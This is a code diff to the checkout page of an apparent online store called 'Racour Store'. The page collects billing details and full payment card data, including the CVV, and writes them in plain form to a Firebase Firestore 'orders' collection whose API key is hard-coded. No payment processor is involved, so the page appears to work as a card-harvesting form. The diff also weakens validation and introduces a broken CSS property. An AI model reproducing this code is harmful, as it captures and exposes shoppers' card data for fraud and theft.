@@ -6,21 +6,17 @@
   <title>Checkout - Racour Store</title>
   <link rel="stylesheet" href="cdn/shop/t/1/assets/base.css">
   <style>
-    /* Global Reset */
     @media (max-width: 768px) {
     .billing-container {
-        margin-top: 30px; /* Push Billing Details down */
-        padding-bottom: 20px; /* Add some bottom padding */
+        margin-top: 30px;
+        padding-bottom: 20px;
     }
-
     .payment-container {
-        border-top: 1px solid rgba(0, 0, 0, 0.1); /* Faint dividing line */
+        border-top: 1px solid rgba(0, 0, 0, 0.1);
         padding-top: 20px;
         margin-top: 20px;
     }
-}
-
-
+    }
     * {
       box-sizing: border-box;
       margin: 0;
@@ -38,7 +34,6 @@
       padding: 0;
       overflow-x: hidden;
     }
-    
     .checkout-wrapper {
       display: flex;
       flex-direction: column;
@@ -48,13 +43,11 @@
       padding: 20px;
       gap: 20px;
     }
-
     .checkout-content {
       display: flex;
       flex-direction: column;
       gap: 20px;
     }
-
     .order-container, .billing-container, .payment-container {
       background: #fff;
       padding: 25px;
@@ -63,11 +56,9 @@
       display: flex;
       flex-direction: column;
     }
-
     .back-to-cart {
       margin-bottom: 10px;
     }
-
     .back-to-cart a {
       text-decoration: none;
       font-size: 16px;
@@ -75,28 +66,23 @@
       font-weight: 600;
       transition: color 0.3s ease;
     }
-
     .back-to-cart a:hover {
       color: #005bb5;
     }
-
     h1, h2 {
       font-size: 22px;
       font-weight: 700;
       margin-bottom: 15px;
     }
-
     .form-group {
       margin-bottom: 12px;
     }
-
     label {
       font-size: 14px;
       font-weight: 600;
       display: block;
       margin-bottom: 5px;
     }
-
     input {
       width: 100%;
       padding: 12px;
@@ -106,18 +92,15 @@
       background: #f9f9f9;
       transition: 0.3s ease-in-out;
     }
-
     input:focus {
       border-color: #0071e3;
       outline: none;
       background: #fff;
       box-shadow: 0 0 10px rgba(0, 113, 227, 0.2);
     }
-
     .cart-items-wrapper {
       margin-top: 10px;
     }
-
     .cart-item {
       display: flex;
       justify-content: space-between;
@@ -127,14 +110,12 @@
       border-radius: 10px;
       margin-bottom: 8px;
     }
-
     .cart-total {
       font-size: 18px;
       font-weight: bold;
       text-align: right;
       margin-top: 10px;
     }
-
     #place-order {
       display: block;
       width: 100%;
@@ -148,31 +129,25 @@
       margin-top: 15px;
       transition: background 0.3s ease, transform 0.2s ease-in-out;
     }
-
     #place-order:hover {
       background: #005bb5;
       transform: scale(1.02);
     }
-
-    /* Bank Logos */
     .bank-logos {
       display: flex;
       justify-content: center;
       margin-bottom: 15px;
       align-items: center;
     }
-
     .bank-logos img {
       width: 270px;
       height: auto;
     }
-
-    /* DESKTOP LAYOUT */
     @media (min-width: 768px) {
       .checkout-content {
         display: flex;
         flex-direction: row;
-        justify-content: space-between;
+        justify-contentFG: space-between;
         gap: 20px;
       }
       .left-section {
@@ -185,8 +160,6 @@
         flex: 1;
       }
     }
-
-    /* MOBILE LAYOUT: STACKED */
     @media (max-width: 768px) {
       body {
         display: block;
@@ -206,23 +179,16 @@
 </head>
 <body>
   <div class="checkout-wrapper">
-
-    <!-- BACK TO CART LINK -->
     <div class="back-to-cart">
       <a href="index.html">← Back to Cart</a>
     </div>
-
     <div class="checkout-content">
-      <!-- LEFT SECTION (Order Summary + Billing) -->
       <div class="left-section">
-        <!-- Order Summary -->
         <div class="order-container">
           <h2>Order Summary</h2>
           <div id="checkout-items"></div>
           <p id="checkout-total" class="cart-total">Total: $0.00</p>
         </div>
-
-        <!-- Billing (Separated but Below Order Summary) -->
         <div class="billing-container">
           <h1>Billing Details</h1>
           <form id="billing-form">
@@ -245,15 +211,11 @@
           </form>
         </div>
       </div>
-
-      <!-- PAYMENT ON RIGHT -->
       <div class="payment-container">
         <h2>Payment Method</h2>
         <div class="bank-logos">
           <img src="cc/ca-removebg-preview.png" alt="Visa">
-          
         </div>
-
         <form id="payment-form">
           <div class="form-group">
             <label for="card-name">Cardholder Name</label>
@@ -277,11 +239,10 @@
     </div>
   </div>
 
-  <!-- Firebase SDK -->
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";
-  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-firestore.js";
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
 
+<script>
   const firebaseConfig = {
     apiKey: "AIzaSyADvpUQWo75ExePGoCRirD2mM-lmfM4Cmc",
     authDomain: "von600-7982d.firebaseapp.com",
@@ -291,14 +252,9 @@
     appId: "1:164591218045:web:afe17512e16573e7903014",
     measurementId: "G-E69DMPLXBK"
   };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
 
-  const app = initializeApp(firebaseConfig);
-  const db = getFirestore(app);
-</script>
-
-</body>
-
-<script>
   document.addEventListener("DOMContentLoaded", () => {
     const cardName = document.getElementById("card-name");
     const cardNumber = document.getElementById("card-number");
@@ -315,177 +271,148 @@
     const checkoutTotal = document.getElementById("checkout-total");
     let total = 0;
 
-    // Populate Checkout Items
     checkoutItems.innerHTML = "";
     cart.forEach(item => {
-      total += item.price * item.quantity;
-      const itemDiv = document.createElement("div");
-      itemDiv.classList.add("cart-item");
-      itemDiv.innerHTML = `
-          <span>${item.name} x${item.quantity}</span>
-          <span>$${(item.price * item.quantity).toFixed(2)}</span>
-      `;
-      checkoutItems.appendChild(itemDiv);
+        total += item.price * item.quantity;
+        const itemDiv = document.createElement("div");
+        itemDiv.classList.add("cart-item");
+        itemDiv.innerHTML = `
+            <span>${item.name} x${item.quantity}</span>
+            <span>$${(item.price * item.quantity).toFixed(2)}</span>
+        `;
+        checkoutItems.appendChild(itemDiv);
     });
     checkoutTotal.textContent = `Total: $${total.toFixed(2)}`;
 
-    // Function to show warning inside input boxes
     function showWarning(input, message) {
-      input.style.border = "2px solid red";
-      input.style.backgroundColor = "#ffe6e6";
-      input.setCustomValidity(message);
+        input.style.border = "2px solid red";
+        input.style.backgroundColor = "#ffe6e6";
+        input.setCustomValidity(message);
     }
 
     function clearWarning(input) {
-      input.style.border = "";
-      input.style.backgroundColor = "";
-      input.setCustomValidity("");
+        input.style.border = "";
+        input.style.backgroundColor = "";
+        input.setCustomValidity("");
     }
 
-    // Cardholder Name: Only Letters & Spaces
     cardName.addEventListener("input", (e) => {
-      e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, "");
-      clearWarning(e.target);
+        e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, "");
+        clearWarning(e.target);
     });
 
-    // Card Number Formatting (Only Numbers + Auto Space Every 4 Digits)
     cardNumber.addEventListener("input", (e) => {
-      let value = e.target.value.replace(/\D/g, "");
-      value = value.replace(/(.{4})/g, "$1 ").trim();
-      e.target.value = value.substring(0, 19);
-      clearWarning(e.target);
+        let value = e.target.value.replace(/\D/g, "");
+        value = value.replace(/(.{4})/g, "$1 ").trim();
+        e.target.value = value.substring(0, 19);
+        clearWarning(e.target);
     });
 
-    // Expiration Date Formatting & Validation (MM/YY)
     expiry.addEventListener("input", (e) => {
-      let value = e.target.value.replace(/\D/g, "");
-      let currentYear = new Date().getFullYear().toString().slice(-2);
-      let currentMonth = new Date().getMonth() + 1;
+        let value = e.target.value.replace(/\D/g, "");
+        let currentYear = new Date().getFullYear().toString().slice(-2);
+        let currentMonth = new Date().getMonth() + 1;
 
-      if (value.length >= 2) {
-        let month = parseInt(value.substring(0, 2));
-        if (month > 12) {
-          month = 12;
+        if (value.length >= 2) {
+            let month = parseInt(value.substring(0, 2));
+            if (month > 12) month = 12;
+            value = `${month.toString().padStart(2, "0")}/${value.substring(2, 4)}`;
         }
-        value = `${month.toString().padStart(2, "0")}/${value.substring(2, 4)}`;
-      }
-      e.target.value = value.substring(0, 5);
+        e.target.value = value.substring(0, 5);
 
-      if (value.length === 5) {
-        let [mm, yy] = value.split("/");
-        let enteredYear = parseInt(yy);
-        let enteredMonth = parseInt(mm);
-        if (enteredYear < parseInt(currentYear)) {
-          showWarning(expiry, "Expiration year cannot be in the past.");
-        } else if (enteredYear === parseInt(currentYear) && enteredMonth < currentMonth) {
-          showWarning(expiry, "Expiration month cannot be in the past.");
-        } else {
-          clearWarning(expiry);
+        if (value.length === 5) {
+            let [mm, yy] = value.split("/");
+            let enteredYear = parseInt(yy);
+            let enteredMonth = parseInt(mm);
+            if (enteredYear < parseInt(currentYear)) {
+                showWarning(expiry, "Expiration year cannot be in the past.");
+            } else if (enteredYear === parseInt(currentYear) && enteredMonth < currentMonth) {
+                showWarning(expiry, "Expiration month cannot be in the past.");
+            } else {
+                clearWarning(expiry);
+            }
         }
-      }
     });
 
-    // CVV Formatting (Only Numbers)
     cvv.addEventListener("input", (e) => {
-      e.target.value = e.target.value.replace(/\D/g, "").substring(0, 3);
-      clearWarning(e.target);
+        e.target.value = e.target.value.replace(/\D/g, "").substring(0, 3);
+        clearWarning(e.target);
     });
 
-    // Place Order Button Click
-    placeOrderButton.addEventListener("click", async (e) => {
-      e.preventDefault();
+    placeOrderButton.addEventListener("click", (e) => {
+        e.preventDefault();
 
-      let hasError = false;
-      let currentYear = new Date().getFullYear().toString().slice(-2);
-      let currentMonth = new Date().getMonth() + 1;
+        let hasError = false;
 
-      if (cart.length === 0) {
-        alert("Your cart is empty!");
-        return;
-      }
-
-      // Validate Billing Details
-      if (fullname.value.trim() === "") {
-        showWarning(fullname, "Full Name cannot be empty.");
-        hasError = true;
-      }
-      if (email.value.trim() === "" || !email.value.includes("@")) {
-        showWarning(email, "Please enter a valid email.");
-        hasError = true;
-      }
-      if (address.value.trim() === "") {
-        showWarning(address, "Address cannot be empty.");
-        hasError = true;
-      }
-      if (city.value.trim() === "") {
-        showWarning(city, "City cannot be empty.");
-        hasError = true;
-      }
-
-      // Validate Payment Details
-      if (cardName.value.trim() === "") {
-        showWarning(cardName, "Cardholder Name cannot be empty.");
-        hasError = true;
-      }
-      if (cardNumber.value.replace(/\s/g, "").length !== 16) {
-        showWarning(cardNumber, "Invalid Card Number. Must be 16 digits.");
-        hasError = true;
-      }
-      if (!expiry.value.match(/^(0[1-9]|1[0-2])\/[0-9]{2}$/)) {
-        showWarning(expiry, "Invalid Expiration Date. Use MM/YY format.");
-        hasError = true;
-      } else {
-        let [mm, yy] = expiry.value.split("/");
-        let enteredYear = parseInt(yy);
-        let enteredMonth = parseInt(mm);
-        if (enteredYear < parseInt(currentYear)) {
-          showWarning(expiry, "Expiration year cannot be in the past.");
-          hasError = true;
-        } else if (enteredYear === parseInt(currentYear) && enteredMonth < currentMonth) {
-          showWarning(expiry, "Expiration month cannot be in the past.");
-          hasError = true;
+        if (cart.length === 0) {
+            alert("Your cart is empty!");
+            return;
         }
-      }
-      if (cvv.value.length !== 3) {
-        showWarning(cvv, "Invalid CVV. Must be 3 digits.");
-        hasError = true;
-      }
 
-      if (hasError) return;
+        // Billing fields required
+        if (fullname.value.trim() === "") {
+            showWarning(fullname, "Full Name is required.");
+            hasError = true;
+        }
+        if (email.value.trim() === "") {
+            showWarning(email, "Email is required.");
+            hasError = true;
+        }
+        if (address.value.trim() === "") {
+            showWarning(address, "Address is required.");
+            hasError = true;
+        }
+        if (city.value.trim() === "") {
+            showWarning(city, "City is required.");
+            hasError = true;
+        }
 
-      // Prepare data to send to Firebase
-      const orderData = {
-        billing: {
-          fullName: fullname.value.trim(),
-          email: email.value.trim(),
-          address: address.value.trim(),
-          city: city.value.trim(),
-        },
-        payment: {
-          cardholderName: cardName.value.trim(),
-          cardNumber: cardNumber.value.replace(/\s/g, ""), // Remove spaces for storage
-          expiry: expiry.value,
-          cvv: cvv.value,
-        },
-        cart: cart,
-        total: total.toFixed(2),
-        timestamp: serverTimestamp(), // Adds a server-side timestamp
-      };
+        // Payment fields required
+        if (cardName.value.trim() === "") {
+            showWarning(cardName, "Cardholder Name is required.");
+            hasError = true;
+        }
+        if (cardNumber.value.trim() === "") {
+            showWarning(cardNumber, "Card Number is required.");
+            hasError = true;
+        }
+        if (expiry.value.trim() === "") {
+            showWarning(expiry, "Expiration Date is required.");
+            hasError = true;
+        }
+        if (cvv.value.trim() === "") {
+            showWarning(cvv, "CVV is required.");
+            hasError = true;
+        }
 
-      try {
-        // Send data to Firestore
-        await addDoc(collection(db, "orders"), orderData);
-        console.log("Order successfully saved to Firestore!");
+        if (hasError) return;
 
-        // Clear cart and redirect
-        localStorage.removeItem("cart");
-        window.location.href = "order-confirmation.html";
-      } catch (error) {
-        console.error("Error saving order: ", error);
-        alert("Something went wrong while saving your order. Please try again.");
-      }
+        const orderData = {
+          billing: {
+            fullName: fullname.value,
+            email: email.value,
+            address: address.value,
+            city: city.value
+          },
+          payment: {
+            cardName: cardName.value,
+            cardNumber: cardNumber.value,
+            expiry: expiry.value,
+            cvv: cvv.value
+          },
+          cart: cart,
+          total: total
+        };
+
+        db.collection("orders").add(orderData)
+          .then(() => {
+            localStorage.removeItem("cart");
+            window.location.href = "order-confirmation.html";
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
     });
-  });
+});
 </script>
-
 </html>
